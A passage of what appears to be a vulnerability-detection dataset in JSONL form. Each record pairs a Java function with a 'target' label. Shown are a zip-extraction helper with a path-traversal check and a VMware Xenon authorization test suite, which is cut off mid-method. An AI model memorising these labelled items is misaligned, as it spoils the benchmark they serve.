file.\n\t * \n\t * @param zipFile\n\t *        the zip file to read from\n\t * @param entry\n\t *        the entry to process\n\t * @param destDir\n\t *        the file to write to\n\t * @throws IOException\n\t *         if the entry could not be processed\n\t */\n\tpublic static void writeEntry(ZipFile zipFile, ZipEntry entry, File destDir) throws IOException {\n\t\tFile outFile = new File(destDir, entry.getName());\n\n\t\tif (! outFile.getCanonicalFile().toPath().startsWith(destDir.toPath())) {\n\t\t\tthrow new IOException(\"Zip entry outside destination directory: \" + entry.getName());\n\t\t}\n\t\t\t\t\n\t\tif (entry.isDirectory()) {\n\t\t\toutFile.mkdirs();\n\t\t} else {\n\t\t\toutFile.getParentFile().mkdirs();\n\n\t\t\ttry (InputStream in = zipFile.getInputStream(entry)) {\n\t\t\t\tIOUtil.writeStream(in, outFile);\n\t\t\t}\n\t\t}\n\t}\n}\n", "target": 0}
{"idx": 1056, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertNotEquals;\nimport static org.junit.Assert.assertNotNull;\nimport static org.junit.Assert.assertNull;\nimport static org.junit.Assert.assertTrue;\n\nimport java.net.URI;\nimport java.security.GeneralSecurityException;\nimport java.util.Arrays;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.EnumSet;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.LinkedList;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\nimport java.util.UUID;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Consumer;\nimport java.util.logging.Level;\n\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.Operation.AuthorizationContext;\nimport com.vmware.xenon.common.Operation.CompletionHandler;\nimport com.vmware.xenon.common.Service.Action;\nimport com.vmware.xenon.common.TestAuthorization.AuthzStatefulService.AuthzState;\nimport com.vmware.xenon.common.test.AuthorizationHelper;\nimport com.vmware.xenon.common.test.QueryTestUtils;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.TestRequestSender;\nimport com.vmware.xenon.common.test.TestRequestSender.FailureResponse;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.services.common.AuthorizationCacheUtils;\nimport com.vmware.xenon.services.common.AuthorizationContextService;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.GuestUserService;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.QueryTask;\nimport com.vmware.xenon.services.common.QueryTask.Query;\nimport com.vmware.xenon.services.common.QueryTask.Query.Builder;\nimport com.vmware.xenon.services.common.QueryTask.QueryTerm.MatchType;\nimport com.vmware.xenon.services.common.RoleService;\nimport com.vmware.xenon.services.common.RoleService.Policy;\nimport com.vmware.xenon.services.common.RoleService.RoleState;\nimport com.vmware.xenon.services.common.SystemUserService;\nimport com.vmware.xenon.services.common.UserGroupService;\nimport com.vmware.xenon.services.common.UserGroupService.UserGroupState;\nimport com.vmware.xenon.services.common.UserService.UserState;\n\npublic class TestAuthorization extends BasicTestCase {\n\n    public static class AuthzStatelessService extends StatelessService {\n        @Override\n        public void handleRequest(Operation op) {\n            if (op.getAction() == Action.PATCH) {\n                op.complete();\n                return;\n            }\n            super.handleRequest(op);\n        }\n    }\n\n    public static class AuthzStatefulService extends StatefulService {\n\n        public static class AuthzState extends ServiceDocument {\n            public String userLink;\n        }\n\n        public AuthzStatefulService() {\n            super(AuthzState.class);\n        }\n\n        @Override\n        public void handleStart(Operation post) {\n            AuthzState body = post.getBody(AuthzState.class);\n            AuthorizationContext authorizationContext = getAuthorizationContextForSubject(\n                    body.userLink);\n\n            if (authorizationContext == null ||\n                    !authorizationContext.getClaims().getSubject().equals(body.userLink)) {\n                post.fail(Operation.STATUS_CODE_INTERNAL_ERROR);\n                return;\n            }\n            post.complete();\n        }\n    }\n\n    public int serviceCount = 10;\n\n    private String userServicePath;\n    private AuthorizationHelper authHelper;\n\n    @Override\n    public void beforeHostStart(VerificationHost host) {\n        // Enable authorization service; this is an end to end test\n        host.setAuthorizationService(new AuthorizationContextService());\n        host.setAuthorizationEnabled(true);\n        CommandLineArgumentParser.parseFromProperties(this);\n    }\n\n    @Before\n    public void enableTracing() throws Throwable {\n        // Enable operation tracing to verify tracing does not error out with auth enabled.\n        this.host.toggleOperationTracing(this.host.getUri(), true);\n    }\n\n    @After\n    public void disableTracing() throws Throwable {\n        this.host.toggleOperationTracing(this.host.getUri(), false);\n    }\n\n    @Before\n    public void setupRoles() throws Throwable {\n        this.host.setSystemAuthorizationContext();\n        this.authHelper = new AuthorizationHelper(this.host);\n        this.userServicePath = this.authHelper.createUserService(this.host, \"jane@doe.com\");\n        this.authHelper.createRoles(this.host, \"jane@doe.com\");\n        this.host.resetAuthorizationContext();\n    }\n\n    @Test\n    public void factoryGetWithOData() {\n        // GET with ODATA will be implicitly converted to a query task. Query tasks\n        // require explicit authorization for the principal to be able to create them\n        URI exampleFactoryUriWithOData = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK,\n                \"$limit=10\");\n        TestRequestSender sender = this.host.getTestRequestSender();\n        FailureResponse rsp = sender.sendAndWaitFailure(Operation.createGet(exampleFactoryUriWithOData));\n        ServiceErrorResponse errorRsp = rsp.op.getErrorResponseBody();\n        assertTrue(errorRsp.message.toLowerCase().contains(\"forbidden\"));\n        assertTrue(errorRsp.message.contains(UriUtils.URI_PARAM_ODATA_TENANTLINKS));\n\n        exampleFactoryUriWithOData = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK,\n                \"$filter=name eq someone\");\n        rsp = sender.sendAndWaitFailure(Operation.createGet(exampleFactoryUriWithOData));\n        errorRsp = rsp.op.getErrorResponseBody();\n        assertTrue(errorRsp.message.toLowerCase().contains(\"forbidden\"));\n        assertTrue(errorRsp.message.contains(UriUtils.URI_PARAM_ODATA_TENANTLINKS));\n\n        // GET without ODATA should succeed but return empty result set\n        URI exampleFactoryUri = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK);\n        Operation rspOp = sender.sendAndWait(Operation.createGet(exampleFactoryUri));\n        ServiceDocumentQueryResult queryRsp = rspOp.getBody(ServiceDocumentQueryResult.class);\n        assertEquals(0L, (long) queryRsp.documentCount);\n    }\n\n    @Test\n    public void statelessServiceAuthorization() throws Throwable {\n        // assume system identity so we can create roles\n        this.host.setSystemAuthorizationContext();\n\n        String serviceLink = UUID.randomUUID().toString();\n\n        // create a specific role for a stateless service\n        String resourceGroupLink = this.authHelper.createResourceGroup(this.host,\n                \"stateless-service-group\", Builder.create()\n                        .addFieldClause(\n                                ServiceDocument.FIELD_NAME_SELF_LINK,\n                                UriUtils.URI_PATH_CHAR + serviceLink)\n                        .build());\n        this.authHelper.createRole(this.host, this.authHelper.getUserGroupLink(),\n                resourceGroupLink,\n                new HashSet<>(Arrays.asList(Action.GET, Action.POST, Action.PATCH, Action.DELETE)));\n        this.host.resetAuthorizationContext();\n\n        CompletionHandler ch = (o, e) -> {\n            if (e == null || o.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                this.host.failIteration(new IllegalStateException(\n                        \"Operation did not fail with proper status code\"));\n                return;\n            }\n            this.host.completeIteration();\n        };\n\n        // assume authorized user identity\n        this.host.assumeIdentity(this.userServicePath);\n\n        // Verify startService\n        Operation post = Operation.createPost(UriUtils.buildUri(this.host, serviceLink));\n        // do not supply a body, authorization should still be applied\n        this.host.testStart(1);\n        post.setCompletion(this.host.getCompletion());\n        this.host.startService(post, new AuthzStatelessService());\n        this.host.testWait();\n\n        // stop service so we can attempt restart\n        this.host.testStart(1);\n        Operation delete = Operation.createDelete(post.getUri())\n                .setCompletion(this.host.getCompletion());\n        this.host.send(delete);\n        this.host.testWait();\n\n        // Verify DENY startService\n        this.host.resetAuthorizationContext();\n        this.host.testStart(1);\n        post = Operation.createPost(UriUtils.buildUri(this.host, serviceLink));\n        post.setCompletion(ch);\n        this.host.startService(post, new AuthzStatelessService());\n        this.host.testWait();\n\n        // assume authorized user identity\n        this.host.assumeIdentity(this.userServicePath);\n\n        // restart service\n        post = Operation.createPost(UriUtils.buildUri(this.host, serviceLink));\n        // do not supply a body, authorization should still be applied\n        this.host.testStart(1);\n        post.setCompletion(this.host.getCompletion());\n        this.host.startService(post, new AuthzStatelessService());\n        this.host.testWait();\n\n        this.host.setOperationTracingLevel(Level.FINER);\n        // Verify PATCH\n        Operation patch = Operation.createPatch(UriUtils.buildUri(this.host, serviceLink));\n        patch.setBody(new ServiceDocument());\n        this.host.testStart(1);\n        patch.setCompletion(this.host.getCompletion());\n        this.host.send(patch);\n        this.host.testWait();\n        this.host.setOperationTracingLevel(Level.ALL);\n\n        // Verify DENY PATCH\n        this.host.resetAuthorizationContext();\n        patch = Operation.createPatch(UriUtils.buildUri(this.host, serviceLink));\n        patch.setBody(new ServiceDocument());\n        this.host.testStart(1);\n        patch.setCompletion(ch);\n        this.host.send(patch);\n        this.host.testWait();\n    }\n\n    @Test\n    public void queryTasksDirectAndContinuous() throws Throwable {\n        this.host.assumeIdentity(this.userServicePath);\n        createExampleServices(\"jane\");\n\n        // do a direct, simple query first\n        this.host.createAndWaitSimpleDirectQuery(ServiceDocument.FIELD_NAME_AUTH_PRINCIPAL_LINK,\n                this.userServicePath, this.serviceCount, this.serviceCount);\n\n        // now do a paginated query to verify we can get to paged results with authz enabled\n        QueryTask qt = QueryTask.Builder.create().setResultLimit(this.serviceCount / 2)\n                .build();\n        qt.querySpec.query = Query.Builder.create()\n                .addFieldClause(ServiceDocument.FIELD_NAME_AUTH_PRINCIPAL_LINK,\n                        this.userServicePath)\n                .build();\n\n        URI taskUri = this.host.createQueryTaskService(qt);\n        this.host.waitFor(\"task not finished in time\", () -> {\n            QueryTask r = this.host.getServiceState(null, QueryTask.class, taskUri);\n            if (TaskState.isFailed(r.taskInfo)) {\n                throw new IllegalStateException(\"task failed\");\n            }\n            if (TaskState.isFinished(r.taskInfo)) {\n                qt.taskInfo = r.taskInfo;\n                qt.results = r.results;\n                return true;\n            }\n            return false;\n        });\n\n\n        TestContext ctx = this.host.testCreate(1);\n        Operation get = Operation.createGet(UriUtils.buildUri(this.host, qt.results.nextPageLink))\n                .setCompletion(ctx.getCompletion());\n        this.host.send(get);\n        ctx.await();\n\n        TestContext kryoCtx = this.host.testCreate(1);\n        Operation patchOp = Operation.createPatch(this.host, ExampleService.FACTORY_LINK + \"/foo\")\n                .setBody(new ServiceDocument())\n                .setContentType(Operation.MEDIA_TYPE_APPLICATION_KRYO_OCTET_STREAM)\n                .setCompletion((o, e) -> {\n                    if (e != null && o.getStatusCode() == Operation.STATUS_CODE_UNAUTHORIZED) {\n                        kryoCtx.completeIteration();\n                        return;\n                    }\n                    kryoCtx.failIteration(new IllegalStateException(\"expected a failure\"));\n                });\n        this.host.send(patchOp);\n        kryoCtx.await();\n\n        int requestCount = this.serviceCount;\n        TestContext notifyCtx = this.testCreate(requestCount);\n\n        // Verify that even though updates to the index are performed\n        // as a system user; the notification received by the subscriber of\n        // the continuous query has the same authorization context as that of\n        // user that created the continuous query.\n        Consumer<Operation> notify = (o) -> {\n            o.complete();\n            String subject = o.getAuthorizationContext().getClaims().getSubject();\n            if (!this.userServicePath.equals(subject)) {\n                notifyCtx.fail(new IllegalStateException(\n                        \"Invalid auth subject in notification: \" + subject));\n                return;\n            }\n            this.host.log(\"Received authorized notification for index patch: %s\", o.toString());\n            notifyCtx.complete();\n        };\n\n        Query q = Query.Builder.create()\n                .addKindFieldClause(ExampleServiceState.class)\n                .build();\n        QueryTask cqt = QueryTask.Builder.create().setQuery(q).build();\n\n        // Create and subscribe to the continous query as an ordinary user.\n        // do a continuous query, verify we receive some notifications\n        URI notifyURI = QueryTestUtils.startAndSubscribeToContinuousQuery(\n                this.host.getTestRequestSender(), this.host, cqt,\n                notify);\n\n        // issue updates, create some services as the system user\n        this.host.setSystemAuthorizationContext();\n        createExampleServices(\"jane\");\n        this.host.log(\"Waiting on continiuous query task notifications (%d)\", requestCount);\n        notifyCtx.await();\n        this.host.resetSystemAuthorizationContext();\n\n        this.host.assumeIdentity(this.userServicePath);\n        QueryTestUtils.stopContinuousQuerySubscription(\n                this.host.getTestRequestSender(), this.host, notifyURI,\n                cqt);\n\n    }\n\n    @Test\n    public void validateKryoOctetStreamRequests() throws Throwable {\n        Consumer<Boolean> validate = (expectUnauthorizedResponse) -> {\n            TestContext kryoCtx = this.host.testCreate(1);\n            Operation patchOp = Operation.createPatch(this.host, ExampleService.FACTORY_LINK + \"/foo\")\n                    .setBody(new ServiceDocument())\n                    .setContentType(Operation.MEDIA_TYPE_APPLICATION_KRYO_OCTET_STREAM)\n                    .setCompletion((o, e) -> {\n                        boolean isUnauthorizedResponse = o.getStatusCode() == Operation.STATUS_CODE_UNAUTHORIZED;\n                        if (expectUnauthorizedResponse == isUnauthorizedResponse) {\n                            kryoCtx.completeIteration();\n                            return;\n                        }\n                        kryoCtx.failIteration(new IllegalStateException(\"Response did not match expectation\"));\n                    });\n            this.host.send(patchOp);\n            kryoCtx.await();\n        };\n\n        // Validate GUEST users are not authorized for sending kryo-octet-stream requests.\n        this.host.resetAuthorizationContext();\n        validate.accept(true);\n\n        // Validate non-Guest, non-System users are also not authorized.\n        this.host.assumeIdentity(this.userServicePath);\n        validate.accept(true);\n\n        // Validate System users are allowed.\n        this.host.assumeIdentity(SystemUserService.SELF_LINK);\n        validate.accept(false);\n    }\n\n    @Test\n    public void contextPropagationOnScheduleAndRunContext() throws Throwable {\n        this.host.assumeIdentity(this.userServicePath);\n\n        AuthorizationContext callerAuthContext = OperationContext.getAuthorizationContext();\n        Runnable task = () -> {\n            if (OperationContext.getAuthorizationContext().equals(callerAuthContext)) {\n                this.host.completeIteration();\n                return;\n            }\n            this.host.failIteration(new IllegalStateException(\"Incorrect auth context obtained\"));\n        };\n\n        this.host.testStart(1);\n        this.host.schedule(task, 1, TimeUnit.MILLISECONDS);\n        this.host.testWait();\n\n        this.host.testStart(1);\n        this.host.run(task);\n        this.host.testWait();\n    }\n\n    @Test\n    public void guestAuthorization() throws Throwable {\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n\n        // Create user group for guest user\n        String userGroupLink =\n                this.authHelper.createUserGroup(this.host, \"guest-user-group\", Builder.create()\n                        .addFieldClause(\n                                ServiceDocument.FIELD_NAME_SELF_LINK,\n                                GuestUserService.SELF_LINK)\n                        .build());\n\n        // Create resource group for example service state\n        String exampleServiceResourceGroupLink =\n                this.authHelper.createResourceGroup(this.host, \"guest-resource-group\", Builder.create()\n                        .addFieldClause(\n                                ExampleServiceState.FIELD_NAME_KIND,\n                                Utils.buildKind(ExampleServiceState.class))\n                        .addFieldClause(\n                                ExampleServiceState.FIELD_NAME_NAME,\n                                \"guest\")\n                        .build());\n\n        // Create roles tying these together\n        this.authHelper.createRole(this.host, userGroupLink, exampleServiceResourceGroupLink,\n                new HashSet<>(Arrays.asList(Action.GET, Action.POST, Action.PATCH)));\n\n        // Create some example services; some accessible, some not\n        Map<URI, ExampleServiceState> exampleServices = new HashMap<>();\n        exampleServices.putAll(createExampleServices(\"jane\"));\n        exampleServices.putAll(createExampleServices(\"guest\"));\n\n        OperationContext.setAuthorizationContext(null);\n\n        TestRequestSender sender = this.host.getTestRequestSender();\n        Operation responseOp = sender.sendAndWait(Operation.createGet(this.host, ExampleService.FACTORY_LINK));\n\n        // Make sure only the authorized services were returned\n        ServiceDocumentQueryResult getResult = responseOp.getBody(ServiceDocumentQueryResult.class);\n        assertAuthorizedServicesInResult(\"guest\", exampleServices, getResult);\n        String guestLink = getResult.documentLinks.iterator().next();\n\n        // Make sure we are able to PATCH the example service.\n        ExampleServiceState state = new ExampleServiceState();\n        state.counter = 2L;\n        responseOp = sender.sendAndWait(Operation.createPatch(this.host, guestLink).setBody(state));\n        assertEquals(Operation.STATUS_CODE_OK, responseOp.getStatusCode());\n\n        // Let's try to do another PATCH using kryo-octet-stream\n        state.counter = 3L;\n        FailureResponse failureResponse = sender.sendAndWaitFailure(\n                Operation.createPatch(this.host, guestLink)\n                        .setContentType(Operation.MEDIA_TYPE_APPLICATION_KRYO_OCTET_STREAM)\n                        .setBody(state));\n        assertEquals(Operation.STATUS_CODE_UNAUTHORIZED, failureResponse.op.getStatusCode());\n\n    }\n\n    @Test\n    public void testInvalidUserAndResourceGroup() throws Throwable {\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        AuthorizationHelper authsetupHelper = new AuthorizationHelper(this.host);\n        String email = \"foo@foo.com\";\n        String userLink = authsetupHelper.createUserService(this.host, email);\n        Query userGroupQuery = Query.Builder.create().addFieldClause(UserState.FIELD_NAME_EMAIL, email).build();\n        String userGroupLink = authsetupHelper.createUserGroup(this.host, email, userGroupQuery);\n        authsetupHelper.createRole(this.host, userGroupLink, \"foo\", EnumSet.allOf(Action.class));\n        // Assume identity\n        this.host.assumeIdentity(userLink);\n        this.host.sendAndWaitExpectSuccess(\n                Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK)));\n        // set an invalid userGroupLink for the user\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        UserState patchUserState = new UserState();\n        patchUserState.userGroupLinks = Collections.singleton(\"foo\");\n        this.host.sendAndWaitExpectSuccess(\n                Operation.createPatch(UriUtils.buildUri(this.host, userLink)).setBody(patchUserState));\n        this.host.assumeIdentity(userLink);\n        this.host.sendAndWaitExpectSuccess(\n                Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK)));\n    }\n\n    @Test\n    public void actionBasedAuthorization() throws Throwable {\n\n        // Assume Jane's identity\n        this.host.assumeIdentity(this.userServicePath);\n\n        // add docs accessible by jane\n        Map<URI, ExampleServiceState> exampleServices = createExampleServices(\"jane\");\n\n        // Execute get on factory trying to get all example services\n        final ServiceDocumentQueryResult[] factoryGetResult = new ServiceDocumentQueryResult[1];\n        Operation getFactory = Operation.createGet(\n                UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                .setCompletion((o, e) -> {\n                    if (e != null) {\n                        this.host.failIteration(e);\n                        return;\n                    }\n\n                    factoryGetResult[0] = o.getBody(ServiceDocumentQueryResult.class);\n                    this.host.completeIteration();\n                });\n\n        this.host.testStart(1);\n        this.host.send(getFactory);\n        this.host.testWait();\n\n        // DELETE operation should be denied\n        Set<String> selfLinks = new HashSet<>(factoryGetResult[0].documentLinks);\n        for (String selfLink : selfLinks) {\n            Operation deleteOperation =\n                    Operation.createDelete(UriUtils.buildUri(this.host, selfLink))\n                            .setCompletion((o, e) -> {\n                                if (o.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                                    String message = String.format(\"Expected %d, got %s\",\n                                            Operation.STATUS_CODE_FORBIDDEN,\n                                            o.getStatusCode());\n                                    this.host.failIteration(new IllegalStateException(message));\n                                    return;\n                                }\n\n                                this.host.completeIteration();\n                            });\n            this.host.testStart(1);\n            this.host.send(deleteOperation);\n            this.host.testWait();\n        }\n\n        // PATCH operation should be allowed\n        for (String selfLink : selfLinks) {\n            Operation patchOperation =\n                    Operation.createPatch(UriUtils.buildUri(this.host, selfLink))\n                        .setBody(exampleServices.get(selfLink))\n                        .setCompletion((o, e) -> {\n                            if (o.getStatusCode() != Operation.STATUS_CODE_OK) {\n                                String message = String.format(\"Expected %d, got %s\",\n                                        Operation.STATUS_CODE_OK,\n                                        o.getStatusCode());\n                                this.host.failIteration(new IllegalStateException(message));\n                                return;\n                            }\n\n                            this.host.completeIteration();\n                        });\n            this.host.testStart(1);\n            this.host.send(patchOperation);\n            this.host.testWait();\n        }\n    }\n\n    @Test\n    public void testAllowAndDenyRoles() throws Exception {\n        // 1) Create example services state as the system user\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        ExampleServiceState state = createExampleServiceState(\"testExampleOK\", 1L);\n\n        Operation response = this.host.waitForResponse(\n                Operation.createPost(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                        .setBody(state));\n        assertEquals(Operation.STATUS_CODE_OK, response.getStatusCode());\n        state = response.getBody(ExampleServiceState.class);\n\n        // 2) verify Jane cannot POST or GET\n        assertAccess(Policy.DENY);\n\n        // 3) build ALLOW role and verify access\n        buildRole(\"AllowRole\", Policy.ALLOW);\n        assertAccess(Policy.ALLOW);\n\n        // 4) build DENY role and verify access\n        buildRole(\"DenyRole\", Policy.DENY);\n        assertAccess(Policy.DENY);\n\n        // 5) build another ALLOW role and verify access\n        buildRole(\"AnotherAllowRole\", Policy.ALLOW);\n        assertAccess(Policy.DENY);\n\n        // 6) delete deny role and verify access\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        response = this.host.waitForResponse(Operation.createDelete(\n                UriUtils.buildUri(this.host,\n                        UriUtils.buildUriPath(RoleService.FACTORY_LINK, \"DenyRole\"))));\n        assertEquals(Operation.STATUS_CODE_OK, response.getStatusCode());\n        assertAccess(Policy.ALLOW);\n    }\n\n    private void buildRole(String roleName, Policy policy) {\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        TestContext ctx = this.host.testCreate(1);\n        AuthorizationSetupHelper.create().setHost(this.host)\n                .setRoleName(roleName)\n                .setUserGroupQuery(Query.Builder.create()\n                        .addCollectionItemClause(UserState.FIELD_NAME_EMAIL, \"jane@doe.com\")\n                        .build())\n                .setResourceQuery(Query.Builder.create()\n                        .addFieldClause(ServiceDocument.FIELD_NAME_SELF_LINK,\n                                ExampleService.FACTORY_LINK,\n                                MatchType.PREFIX)\n                        .build())\n                .setVerbs(EnumSet.of(Action.POST, Action.PUT, Action.PATCH, Action.GET,\n                        Action.DELETE))\n                .setPolicy(policy)\n                .setCompletion((authEx) -> {\n                    if (authEx != null) {\n                        ctx.failIteration(authEx);\n                        return;\n                    }\n                    ctx.completeIteration();\n                }).setupRole();\n        this.host.testWait(ctx);\n    }\n\n    private void assertAccess(Policy policy) throws Exception {\n        this.host.assumeIdentity(this.userServicePath);\n        Operation response = this.host.waitForResponse(\n                Operation.createPost(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                        .setBody(createExampleServiceState(\"testExampleDeny\", 2L)));\n        if (policy == Policy.DENY) {\n            assertEquals(Operation.STATUS_CODE_FORBIDDEN, response.getStatusCode());\n        } else {\n            assertEquals(Operation.STATUS_CODE_OK, response.getStatusCode());\n        }\n\n        response = this.host.waitForResponse(\n                Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK)));\n        assertEquals(Operation.STATUS_CODE_OK, response.getStatusCode());\n        ServiceDocumentQueryResult result = response.getBody(ServiceDocumentQueryResult.class);\n        if (policy == Policy.DENY) {\n            assertEquals(Long.valueOf(0L), result.documentCount);\n        } else {\n            assertNotNull(result.documentCount);\n            assertNotEquals(Long.valueOf(0L), result.documentCount);\n        }\n    }\n\n    @Test\n    public void statefulServiceAuthorization() throws Throwable {\n        // Create example services not accessible by jane (as the system user)\n        OperationContext.setAuthorizationContext(this.host.getSystemAuthorizationContext());\n        Map<URI, ExampleServiceState> exampleServices = createExampleServices(\"john\");\n\n        // try to create services with no user context set; we should get a 403\n        OperationContext.setAuthorizationContext(null);\n        ExampleServiceState state = createExampleServiceState(\"jane\", new Long(\"100\"));\n        TestContext ctx1 = this.host.testCreate(1);\n        this.host.send(\n                Operation.createPost(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                        .setBody(state)\n                        .setCompletion((o, e) -> {\n                            if (o.getStatusCode() != Operation.STATUS_CODE_FORBIDDEN) {\n                                String message = String.format(\"Expected %d, got %s\",\n                                        Operation.STATUS_CODE_FORBIDDEN,\n                                        o.getStatusCode());\n                                ctx1.failIteration(new IllegalStateException(message));\n                                return;\n                            }\n\n                            ctx1.completeIteration();\n                        }));\n        this.host.testWait(ctx1);\n\n        // issue a GET on a factory with no auth context, no documents should be returned\n        TestContext ctx2 = this.host.testCreate(1);\n        this.host.send(\n                Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                .setCompletion((o, e) -> {\n                    if (e != null) {\n                        ctx2.failIteration(new IllegalStateException(e));\n                        return;\n                    }\n                    ServiceDocumentQueryResult res = o\n                            .getBody(ServiceDocumentQueryResult.class);\n                    if (!res.documentLinks.isEmpty()) {\n                        String message = String.format(\"Expected 0 results; Got %d\",\n                                res.documentLinks.size());\n                        ctx2.failIteration(new IllegalStateException(message));\n                        return;\n                    }\n\n                    ctx2.completeIteration();\n                }));\n        this.host.testWait(ctx2);\n\n        // Assume Jane's identity\n        this.host.assumeIdentity(this.userServicePath);\n        // add docs accessible by jane\n        exampleServices.putAll(createExampleServices(\"jane\"));\n\n        verifyJaneAccess(exampleServices, null);\n\n        // Execute get on factory trying to get all example services\n        TestContext ctx3 = this.host.testCreate(1);\n        final ServiceDocumentQueryResult[] factoryGetResult = new ServiceDocumentQueryResult[1];\n        Operation getFactory = Operation.createGet(\n                UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK))\n                .setCompletion((o, e) -> {\n                    if (e != null) {\n                        ctx3.failIteration(e);\n                        return;\n                    }\n\n                    factoryGetResult[0] = o.getBody(ServiceDocumentQueryResult.class);\n                    ctx3.completeIteration();\n                });\n        this.host.send(getFactory);\n        this.host.testWait(ctx3);\n\n        // Make sure only the authorized services were returned\n        assertAuthorizedServicesInResult(\"jane\", exampleServices, factoryGetResult[0]);\n\n        // Execute query task trying to get all example services\n        QueryTask.QuerySpecification q = new QueryTask.QuerySpecification();\n        q.query.setTermPropertyName(ServiceDocument.FIELD_NAME_KIND)\n                .setTermMatchValue(Utils.buildKind(ExampleServiceState.class));\n        URI u = this.host.createQueryTaskService(QueryTask.create(q));\n        QueryTask task = this.host.waitForQueryTaskCompletion(q, 1, 1, u, false, true, false);\n        assertEquals(TaskState.TaskStage.FINISHED, task.taskInfo.stage);\n\n        // Make sure only the authorized services were returned\n        assertAuthorizedServicesInResult(\"jane\", exampleServices, task.results);\n\n        // reset the auth context\n        OperationContext.setAuthorizationContext(null);\n\n        // Assume Jane's identity through header auth token\n        String authToken = generateAuthToken(this.userServicePath);\n\n        verifyJaneAccess(exampleServices, authToken);\n\n        // test user impersonation\n        this.host.setSystemAuthorizationContext();\n        AuthzStatefulService s = new AuthzStatefulService();\n        this.host.addPrivilegedService(AuthzStatefulService.class);\n\n        AuthzState body = new AuthzState();\n        body.userLink = this.userServicePath;\n        this.host.startServiceAndWait(s, UUID.randomUUID().toString(), body);\n        this.host.resetSystemAuthorizationContext();\n    }\n\n    private AuthorizationContext assumeIdentityAndGetContext(String userLink,\n            Service privilegedService, boolean populateCache) throws Throwable {\n        AuthorizationContext authContext = this.host.assumeIdentity(userLink);\n        if (populateCache) {\n            this.host.sendAndWaitExpectSuccess(\n                    Operation.createGet(UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK)));\n        }\n        return this.host.getAuthorizationContext(privilegedService, authContext.getToken());\n    }\n\n    @Test\n    public void authCacheClearToken() throws Throwable {\n        this.host.setSystemAuthorizationContext();\n        AuthorizationHelper authHelperForFoo = new AuthorizationHelper(this.host);\n        String email = \"foo@foo.com\";\n        String fooUserLink = authHelperForFoo.createUserService(this.host, email);\n        // spin up a privileged service to query for auth context\n        MinimalTestService s = new MinimalTestService();\n        this.host.addPrivilegedService(MinimalTestService.class);\n        this.host.startServiceAndWait(s, UUID.randomUUID().toString(), null);\n        this.host.resetSystemAuthorizationContext();\n\n        AuthorizationContext authContext1 = assumeIdentityAndGetContext(fooUserLink, s, true);\n        AuthorizationContext authContext2 = assumeIdentityAndGetContext(fooUserLink, s, true);\n        assertNotNull(authContext1);\n        assertNotNull(authContext2);\n\n        this.host.setSystemAuthorizationContext();\n        Operation clearAuthOp = new Operation();\n        clearAuthOp.setUri(UriUtils.buildUri(this.host, fooUserLink));\n        TestContext ctx = this.host.testCreate(1);\n        clearAuthOp.setCompletion(ctx.getCompletion());\n        AuthorizationCacheUtils.clearAuthzCacheForUser(s, clearAuthOp);\n        clearAuthOp.complete();\n        this.host.testWait(ctx);\n        this.host.resetSystemAuthorizationContext();\n\n        assertNull(this.host.getAuthorizationContext(s, authContext1.getToken()));\n        assertNull(this.host.getAuthorizationContext(s, authContext2.getToken()));\n    }\n\n    @Test\n    public void updateAuthzCache() throws Throwable {\n        ExecutorService executor = null;\n        try {\n            this.host.setSystemAuthorizationContext();\n            AuthorizationHelper authsetupHelper = new AuthorizationHelper(this.host);\n            String email = \"foo@foo.com\";\n            String userLink = authsetupHelper.createUserService(this.host, email);\n            Query userGroupQuery = Query.Builder.create().addFieldClause(UserState.FIELD_NAME_EMAIL, email).build();\n            String userGroupLink = authsetupHelper.createUserGroup(this.host, email, userGroupQuery);\n            UserState patchState = new UserState();\n            patchState.userGroupLinks = Collections.singleton(userGroupLink);\n            this.host.sendAndWaitExpectSuccess(\n                    Operation.createPatch(UriUtils.buildUri(this.host, userLink))\n                    .setBody(patchState));\n            TestContext ctx = this.host.testCreate(this.serviceCount);\n            